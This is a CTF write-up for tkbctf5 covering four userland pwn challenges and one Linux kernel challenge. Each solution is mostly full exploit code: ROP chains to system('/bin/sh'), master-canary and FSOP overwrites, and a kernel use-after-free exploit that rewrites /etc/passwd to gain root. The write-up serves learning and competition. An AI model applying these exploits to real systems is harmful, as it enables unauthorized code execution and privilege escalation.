# tkbctf 5

I participated [tkbctf5](https://alpacahack.com/ctfs/tkbctf5) with 0xL4ugh.

We got 3rd place with 4161 pts.

I solved 5 pwn challenges + 1 crypto challenge.

![Screenshot_20260315_141454.png](Screenshot_20260315_141454.png)

In this wu, I'll explain how I solve these pwn challenges.

## stack bof
<primary-label ref="pwn"/>

Most of the mitigations were enabled.

```c
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The source code was quite simple. I can earn libc addr and have 8 bytes aaw primitive, also stack bof.

```c
// gcc -Wl,-z,now,-z,relro main.c -o stack-bof
#include <stdio.h>
#include <stdint.h>

int main() {
  char buf[8];
  uint64_t* dest = 0;
  printf("printf: %p\n", printf);
  
  read(0, &dest, 8);
  read(0, dest, 8);

  gets(buf);
}

__attribute__((constructor)) void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}
```

in the docker container, the offset between tls and libc was constant.

I overwrote master canary to bypass canary.

```py
tls_off = -12288

ru(b"printf: ")
leak = int(rl().strip(),0x10)
hl(leak)

libc.address = leak - libc.sym["printf"]
hl(libc.address)

tls = libc.address + tls_off
hl(tls)

#tls = int(input("tls"),0x10)

s(p64(tls+0x28+0x740))
s(p64(0xdeadbeafabad1d00))

pay(
    0xdeadbeafabad1d00,
    0xdeadbeafabad1d00,
    libc.address + 0x00202000+0x800,
    libc.address + 0x10f78b,
    next(libc.search(b"/bin/sh\x00")),
    libc.address + 0x10f78c,
    libc.sym["system"]
)

sl(payload)

shell()
```

## pyFSB
<primary-label ref="pwn"/>

in python, we can do fsb with (n) for i64, (0&) for function call.
simply leak stable addr from stack and calculate libc base (off was constant), then call system("/bin/sh");

```py
ru(b"welcome to fsb service\n")
a=b"(n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n)"

sl(a)

leak = r()
#ic(leak)
for i in range(len(leak[1:-3].split(b", "))):
    val = int(leak[1:-3].split(b", ")[i])
#    print(f"{i}:{hex(val)}")
leak = int(leak[1:-1].split(b", ")[48])
hl(leak)

e.address = leak-(0x7c0ac4fa0020-0x7c0ac4e9b000)
hl(e.address)
libc.address = e.address+(0x722fa4aac000-0x722fa47df000)
#libc.address = int(input("libc> "),0x10)
hl(libc.address)

one_gadget = [0x583ec,0x583f3,0xef4ce,0xef52b]
this_time_one_gadget = libc.address + one_gadget[0]
hl(this_time_one_gadget)
fmt = b"(n,n,n,n,n,n,n,n,n,n,O&)"
fmt = fmt.ljust(40, b"\x00")
#fmt += p64(this_time_one_gadget)
fmt += p64(libc.sym["system"])
fmt += p64(next(libc.search(b"/bin/sh\x00")))
sl(fmt)

shell()
```

## BSS BOF
<primary-label ref="pwn"/>

In this challenge, we can earn libc addr, 8 bytes aaw primitive same as STACK BOF challenge.

But in this time, the victim buffer of bof is placed in bss.

```c
// gcc -Wl,-z,now,-z,relro main.c -o bss-bof
#include <stdio.h>
#include <stdint.h>

char buf[8];
int main() {
  uint64_t* dest = 0;
  printf("printf: %p\n", printf);
  
  read(0, &dest, 8);
  read(0, dest, 8);

  gets(buf);
}

__attribute__((constructor)) void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}
```

First, I overwrote `_IO_buf_base`, with this, we can write to stdin as buffer in gets(bss) for 0x84 bytes.

![Screenshot_20260315_143343.png](Screenshot_20260315_143343.png)

Second, I overwrote most of the members of `_IO_2_1_stdin_`.

- `_IO_read_ptr` -> `_IO_2_1_stderr_`
- `_IO_read_end` -> `_IO_2_1_stderr_`
- `_IO_read_base` -> `_IO_2_1_stderr_`
- `_IO_write_base` -> `_IO_2_1_stderr_`
- `_IO_write_ptr` -> `_IO_2_1_stderr_`
- `_IO_write_end` -> `_IO_2_1_stderr_`
- `_IO_buf_base` -> `_IO_2_1_stderr_`
- `_IO_buf_end` -> `_IO_2_1_stderr_+0xe8`

With this, we can overwrite `_IO_2_1_stderr_`.

![Screenshot_20260315_143524.png](Screenshot_20260315_143524.png)

Finally do `fsop`.

```py
ru(b"printf: ")
leak = int(rl().strip(),0x10)
hl(leak)
libc.address = leak - libc.sym["printf"]
hl(libc.address)

s(p64(libc.sym["_IO_2_1_stdin_"]+0x38))

stderr = (libc.sym["_IO_2_1_stderr_"])
s(p64(libc.sym["_IO_2_1_stdin_"]))

system = (libc.sym["system"])
wfile_jumps = (libc.sym["_IO_wfile_jumps"])

file = b""
file+= p64(0xfbad208b)
file+= p64(libc.sym["_IO_2_1_stderr_"]+0xe8)
file+= p64(libc.sym["_IO_2_1_stderr_"]+0xe8)
file+= p64(libc.sym["_IO_2_1_stderr_"])
file+= p64(libc.sym["_IO_2_1_stderr_"])
file+= p64(libc.sym["_IO_2_1_stderr_"])
file+= p64(libc.sym["_IO_2_1_stderr_"])
file+= p64(libc.sym["_IO_2_1_stderr_"])
file+= p64(libc.sym["_IO_2_1_stderr_"]+0xe8)
file+= p64(0)
file+= p64(0)
file+= p64(0)
file+= p64(0)
file+= p64(0)
file+= p64(0)
file+= p64(0xffffffffffffffff)
file+= p64(0)
s(file[:0x84])

input("go")

file = b""
file += b"  sh;"  # flags
#file = file.ljust(0x8, b"\0")
#file += p64(stderr+0x88)  # flags
file = file.ljust(0x20, b"\0")
file += p64(0)  # _IO_write_base
file += p64(1)  # _IO_write_ptr
file = file.ljust(0x58, b"\0")  #
file += p64(system)  # _wide_vtable + 0x68 (stderr - 0x10 + 0x68)
file = file.ljust(0x88, b"\0")
file += p64(stderr - 0x10)  # _lock
file = file.ljust(0xA0, b"\0")
file += p64(stderr - 0x10)  # _wide_data
file = file.ljust(0xC0, b"\0")
file += p64(0)  # _mode
file = file.ljust(0xD0, b"\0")
file += p64(stderr - 0x10)  # _wide_data._wide_vtable (stderr - 0x10 + 0xe0)
file += p64(wfile_jumps)

sl(file)


shell()
```

## read exact
<primary-label ref="pwn"/>

The vulnerability was simple, we can do stack based bof (also canary bypass) with -8.

Hard chaining for shell :cry:.

- gadget for leak libc addr

![Screenshot_20260315_144651.png](Screenshot_20260315_144651.png)

- gadget for stack pivot

![Screenshot_20260315_144742.png](Screenshot_20260315_144742.png)

- gadget for rbp-relative write

![Screenshot_20260315_144858.png](Screenshot_20260315_144858.png)

- gadget for aaw

![Screenshot_20260315_144818.png](Screenshot_20260315_144818.png)

```py
pop_rbp_ret = 0x0040133a
ret = 0x0040133b

sln(-8)
rst()
pay(
    0xdeadbeaf, #r13
    0xabad1dea, #r14
    0x00404800, #rbp
    0x004011f4, #get_size
    0x0000004047b8, #rbp
    0x004012d0, #mov rsp, rbp; pop rbp; ret;
    0xdeadbeaf0003,
    0xdeadbeaf0004,
    0xdeadbeaf0005,
)
s(payload)

canary = 0x0000004047f8
rst()
pay(
    b"1\x00\x00\x00\x00\x00\x00",
    pop_rbp_ret,
    0x000000404900,
    0x004011f4,
    0x0000004048b0, #rbp
    0x004012d0, #mov rsp, rbp; pop rbp; ret;
    0xabad1dea0000,
)
s(payload)

rst()
pay(
    b"A"*0x7,
    pop_rbp_ret,
    0x000000404648+0x48,
    0x004011f4,
    0x00404a00,
    0x004011f4,
    0x0000004049a8,
    0x004012d0, #mov rsp, rbp; pop rbp; ret;
    0xdeadbeaf0005,
)
s(payload)

rst()
pay(
    b"A"*0x7,
    0x12340000,
    0x12340000,
    0x12340000,
    e.got["fgets"]
)
sl(payload)

rst()
pay(
    pop_rbp_ret,
    0x00404b00-0x90-0x8,
    0x004011f4,
    0x000000404a60-0x8,
    ret,
    ret,
    ret,
    0x004012f0,
)
s(payload[:0x3f])


rst()
pay(
    pop_rbp_ret,
    0x000000404690,
    0x004012a1,
    0xdeadbeaf0004,
    0xdeadbeaf0005,
    0x0,
    0x30,
    0x000000404690,
)
s(payload[:0x3f])

rst()
pay(
    0x00404c00,
    0x004011f4,
    0x000000404ba8,
    0x004012d0, #mov rsp, rbp; pop rbp; ret;
    0xdeadbeaf0005,
    0xdeadbeaf0006,
)
s(payload)

ru(b"bye! ")
leak = pu64(rl().strip())
hl(leak)
libc.address = leak-(0x7a7556285b30 - 0x00007a7556200000)
hl(libc.address)

rst()
pay(
    libc.address + 0x10f78b,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym["system"]
)
sl(payload)


shell()
```

## Hungry Goats
<primary-label ref="kernel"/>

This challenge is what I first try to solve in this CTF. Very beautiful kernel puzzling.

```c
goat_ep_init(&white_ep, "white_goat");
goat_ep_init(&black_ep, "black_goat");
```

The challenge provides a vulnerable kernel module that creates two paired misc devices: `/dev/white_goat` and `/dev/black_goat`.

These act as communication endpoints using sk_buff.

Writing to one endpoint queues a clone on the peer's receive queue, and reading dequeues and frees all pending packets. An ioctl (GOAT_RESEND_PKT) allows cloning the peer's last sent packet, optionally stripping a 16-byte signature.

### bug

```c
  data = skb_put(skb, len);
  skb->data_len += len;
```

skb->data_len should only track paged/fragment data. skb_put already incremented skb->len to account for the linear data. By also adding len to data_len, the module makes the kernel believe the entire skb payload is paged:

claude opus told me this bug.

`skb_headlen` = `skb->len` - `skb->data_len` = always 0
```c
    if (eat_signature) {
      if (skb_headlen(skb) >= SIGNATURE_SIZE) {
        skb_pull(skb, SIGNATURE_SIZE);
      } else {
        pskb_pull(skb, SIGNATURE_SIZE);
      }
    }
```

skb_clone creates a lightweight copy that shares the underlying data buffer (and skb_shared_info including page fragment references) with the original. To track shared ownership, skb_shared_info.dataref is incremented on each clone.

The key insight is that skb_cloned() only checks the lower 16 bits of dataref:

[](https://elixir.bootlin.com/linux/v6.17.11/source/include/linux/skbuff.h#L659)
```c
#define SKB_DATAREF_MASK ((1 << SKB_DATAREF_SHIFT) - 1)
```

[](https://elixir.bootlin.com/linux/v6.17.11/source/include/linux/skbuff.h#L1985)
```c
static inline int skb_cloned(const struct sk_buff *skb)
{
	return skb->cloned &&
	       (atomic_read(&skb_shinfo(skb)->dataref) & SKB_DATAREF_MASK) != 1;
}
```

So, with 
- `goat_write` creates the original skb and one clone (`skb->dataref`=2),
- resends for until `skb->dataref&0xffff=0`
- one more clone with `eat_signature=true`->`skb->dataref=0x10001`
- call `pskb_pull` -> `__pskb_pull_tail` [](https://elixir.bootlin.com/linux/v6.17.11/source/net/core/skbuff.c#L2807)

```c
	if (eat > 0 || skb_cloned(skb)) { // <- false
		if (pskb_expand_head(skb, 0, eat > 0 ? eat + 128 : 0,
				     GFP_ATOMIC))
			return NULL;
	}
```

The pull then operates in-place on the shared skb_shared_info:

1. Copies the 16-byte signature from the page frag into the linear tail area
2. Fully consumes the frag → calls skb_frag_unref[](https://elixir.bootlin.com/linux/v6.17.11/source/net/core/skbuff.c#L2896) -> unref -> put_netmem -> put_page
3. Page refcount drops from 1 to 0 → the signature page is freed

Since pskb_expand_head was skipped, the skb_shared_info is shared between all clones and the white_ep.last_skb.
The page frag is now gone from the shared info (nr_frags = 0) —> use-after-free.

if we allocate object larger than order-4 (`PAGE_SIZE*(1<<4)`), kmalloc allocate object from buddy allocator.

so if we send packet with `(PAGE_SIZE*(1<<4))-sizeof(skb_shared_info)`, uaf will be page-level uaf.

```c
struct sk_buff *skb_clone(struct sk_buff *skb, gfp_t gfp_mask)
{
	struct sk_buff_fclones *fclones = container_of(skb,
						       struct sk_buff_fclones,
						       skb1);
	struct sk_buff *n;

	if (skb_orphan_frags(skb, gfp_mask))
		return NULL;

	if (skb->fclone == SKB_FCLONE_ORIG &&
	    refcount_read(&fclones->fclone_ref) == 1) {
		n = &fclones->skb2;
		refcount_set(&fclones->fclone_ref, 2);
		n->fclone = SKB_FCLONE_CLONE;
	} else {
		if (skb_pfmemalloc(skb))
			gfp_mask |= __GFP_MEMALLOC;

		n = kmem_cache_alloc(net_hotdata.skbuff_cache, gfp_mask);
		if (!n)
			return NULL;

		n->fclone = SKB_FCLONE_UNAVAILABLE;
	}

	return __skb_clone(n, skb);
}
EXPORT_SYMBOL(skb_clone);
```
```c
static struct sk_buff *__skb_clone(struct sk_buff *n, struct sk_buff *skb)
{
#define C(x) n->x = skb->x

	n->next = n->prev = NULL;
	n->sk = NULL;
	__copy_skb_header(n, skb);

	C(len);
	C(data_len);
	C(mac_len);
	n->hdr_len = skb->nohdr ? skb_headroom(skb) : skb->hdr_len;
	n->cloned = 1;
	n->nohdr = 0;
	n->peeked = 0;
	C(pfmemalloc);
	C(pp_recycle);
	n->destructor = NULL;
	C(tail);
	C(end);
	C(head);
	C(head_frag);
	C(data);
	C(truesize);
	refcount_set(&n->users, 1);

	atomic_inc(&(skb_shinfo(skb)->dataref)); <- inc premitive
	skb->cloned = 1;

	return n;
#undef C
}
```


For now, we have increment primitive in freed page. -> use dirty page flags technique like black hat mea kernel challenge. [](https://ptr-yudai.hatenablog.com/entry/2025/09/14/180326)

![Screenshot_20260315_172658.png](Screenshot_20260315_172658.png)

```c
---------------------------------------------------------------------------------------------------------------------- registers ----
$rax   : 0xffff929b01d1fec0  ->  0x0000000000000000
$rbx   : 0xffff929b011c3900  ->  0x0000000000000000
$rcx   : 0xffff000000000000
$rdx   : 0x0000000000000000
$rsp   : 0xffffa2c080117e70  ->  0xffffa2c080117f10  ->  0xffff929b01afe000  ->  0x0000000000000000
$rbp   : 0xffff929b02eb5b00  ->  0x0000000000000000
$rsi   : 0xffff929b011c3900  ->  0x0000000000000000
$rdi   : 0xffff929b02eb5b00  ->  0x0000000000000000
$rip   : 0xffffffffad84520f  ->  0x01764b802040ff3e
$r8    : 0xffff929b01a80de0  ->  0x00000000000521b6
$r9    : 0x0000000000000000
$r10   : 0x0000000000000000
$r11   : 0x0000000000000000
$r12   : 0x0000000000000000
$r13   : 0xffffffffc0313520  ->  0x0000000000000102
$r14   : 0xffff929b013fa6c0  ->  0x040e001b00000000
$r15   : 0x0000000000000000
$eflags: 0x286 [ident align vx86 resume nested overflow direction INTERRUPT trap SIGN zero adjust PARITY carry] [Ring=0]
$cs: 0x10 $ss: 0x18 $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
-------------------------------------------------------------------------------------------------------------------------- stack ----
$rsp  0xffffa2c080117e70|+0x0000|+000: 0xffffa2c080117f10  ->  0xffff929b01afe000  ->  0x0000000000000000  <-  retaddr[1]
      0xffffa2c080117e78|+0x0008|+001: 0x0000000001337000
      0xffffa2c080117e80|+0x0010|+002: 0xffffffffc03134a0  ->  0x0000000000000103  <-  retaddr[3]
      0xffffa2c080117e88|+0x0018|+003: 0xffffffffc0400336  ->  0x5774c08548c38948  <-  retaddr[4]
      0xffffa2c080117e90|+0x0020|+004: 0x0000000001337000
      0xffffa2c080117e98|+0x0028|+005: 0xffff929b013fa6c0  ->  0x040e001b00000000  <-  $r14
      0xffffa2c080117ea0|+0x0030|+006: 0x0000000000000000
      0xffffa2c080117ea8|+0x0038|+007: 0x0000000000000004
------------------------------------------------------------------------------------------------------ code: x86:64 (gdb-native) ----
    0xffffffffad8451fc 8985c8000000            <NO_SYMBOL>   mov    DWORD PTR [rbp + 0xc8], eax 
    0xffffffffad845202 8b83b0000000            <NO_SYMBOL>   mov    eax, DWORD PTR [rbx + 0xb0] 
    0xffffffffad845208 480383b8000000          <NO_SYMBOL>   add    rax, QWORD PTR [rbx + 0xb8] 
*-> 0xffffffffad84520f 3eff4020                <NO_SYMBOL>   ds     inc DWORD PTR [rax + 0x20] 
    0xffffffffad845213 804b7601                <NO_SYMBOL>   or     BYTE PTR [rbx + 0x76], 0x1 
    0xffffffffad845217 4883c408                <NO_SYMBOL>   add    rsp, 0x8 
    0xffffffffad84521b 4889e8                  <NO_SYMBOL>   mov    rax, rbp 
    0xffffffffad84521e 5b                      <NO_SYMBOL>   pop    rbx 
    0xffffffffad84521f 5d                      <NO_SYMBOL>   pop    rbp 
---------------------------------------------------------------------------------- memory access: $rax+0x20 = 0xffff929b01d1fee0 ----
      0xffff929b01d1fee0|+0x0000|+000: 0x8000000007a99025
      0xffff929b01d1fee8|+0x0008|+001: 0x0000000000000000
      0xffff929b01d1fef0|+0x0010|+002: 0x0000000000000000
      0xffff929b01d1fef8|+0x0018|+003: 0x0000000000000000
------------------------------------------------------------------------------------------------------------------------ threads ----
[*Thread Id:1, tid:1] stopped at 0xffffffffad84520f <NO_SYMBOL>, reason: BREAKPOINT
-------------------------------------------------------------------------------------------------------------------------- trace ----
[*#0] 0xffffffffad84520f <NO_SYMBOL>
[ #1] 0xffffa2c080117f10 <NO_SYMBOL>
[ #2] 0x0000000001337000 <NO_SYMBOL>
[ #3] 0xffffffffc03134a0 <NO_SYMBOL>
[ #4] 0xffffffffc0400336 <NO_SYMBOL>
[ #5] 0x0000000001337000 <NO_SYMBOL>
[ #6] 0xffff929b013fa6c0 <NO_SYMBOL>
[ #7] 0x0000000000000000 <NO_SYMBOL>
```
```c
$rax  0xffff929b01d1fec0|+0x0000|+000: 0x0000000000000000
      0xffff929b01d1fec8|+0x0008|+001: 0x0000000000000000
      0xffff929b01d1fed0|+0x0010|+002: 0x0000000000000000
      0xffff929b01d1fed8|+0x0018|+003: 0x0000000000000000
      0xffff929b01d1fee0|+0x0020|+004: 0x8000000007a99025 <- pte
```

```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "e.h"


#define DEVICE_NAME_1 "/dev/white_goat"
#define DEVICE_NAME_2 "/dev/black_goat"

#define GOAT_RESEND_PKT 0x1337000
#define N_SPRAY 0x80
#define INC_OFF 0xfee0
#define MAX_N_WRITE (PAGE_SZ*(1<<4)-0x140)
char req[MAX_N_WRITE];

int main(void) {
    int fd_1 = open(DEVICE_NAME_1,O_RDWR);
    int fd_2 = open(DEVICE_NAME_2,O_RDWR);
    int fd_3 = open("/etc/passwd", O_RDONLY);

    write(fd_1,req,MAX_N_WRITE);
    info("fill data_ref&0xffff")
    for(int i=2; (i&0xffff)!=0;i++) {
        ioctl(fd_2,GOAT_RESEND_PKT,false);
    }
    info("trig pskb_pull")
    ioctl(fd_2, GOAT_RESEND_PKT, true);

    info("dirty page flags")
    char *ptes[N_SPRAY];
    rep(i, N_SPRAY) {
        ptes[i] = mmap(PTI_TO_VIRT(0x1,0x0,i,((INC_OFF)%0x1000)/8,0), PAGE_SZ, PROT_READ, MAP_PRIVATE| MAP_FIXED,fd_3,0);
        info("[spray %x/%x]: %p",i,N_SPRAY,ptes[i]);
        char tmp = *(ptes[i]);
    }
    info("dbg")
    getchar();
    ioctl(fd_2,GOAT_RESEND_PKT,false);   
    ioctl(fd_2,GOAT_RESEND_PKT,false);   

    int fd_4 = open("/tmp/114514",O_RDWR|O_CREAT,0666);
    write(fd_4, "root::0:0:root:/root:/bin/sh\n", 29);
    rep(i,N_SPRAY) {
      ssize_t s;
      lseek(fd_4, 0, SEEK_SET);
      s = read(fd_4, ptes[i], 29);
      if (s > 0) break;
      lseek(fd_4, 0, SEEK_SET);
      read(fd_4, ptes[i]+0x800, 29);
      if (s > 0) break;
    }
    system("su - ");
}
```

![Screenshot_20260315_173609.png](Screenshot_20260315_173609.png)
